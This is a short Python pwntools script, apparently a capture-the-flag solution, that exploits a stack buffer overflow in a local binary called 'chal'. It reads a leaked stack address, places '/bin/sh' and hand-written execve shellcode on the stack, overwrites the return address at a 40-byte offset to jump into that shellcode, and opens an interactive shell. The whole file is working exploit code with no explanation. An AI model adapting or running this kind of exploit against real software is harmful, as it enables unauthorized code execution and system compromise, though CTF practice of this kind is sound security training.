from pwn import *

EXE_FILENAME = "./chal"
exe = ELF(EXE_FILENAME)
context.binary = exe

offset = 40

#p = gdb.debug([EXE_FILENAME], gdbscript='''
#	b *main+109
#	c
#	''')

p = process(EXE_FILENAME)

p.recvuntil(b"... ")
leak = p.recvline().replace(b"\n",b"")
leak = int(leak.decode(), 16)

print(hex(leak))

shellcode = f'''
			mov rax, 0x3b
			mov rdi, {hex(leak + 8)}
			xor rsi, rsi
			xor rdx, rdx
			syscall
'''

shellcode = asm(shellcode)

payload = flat(
	b"/bin/sh\0",
 	shellcode,
 	b"A" * (offset - 8 - len(shellcode)),
 	leak + 0x10
 )

print(len(payload))

p.send(payload)


p.interactive()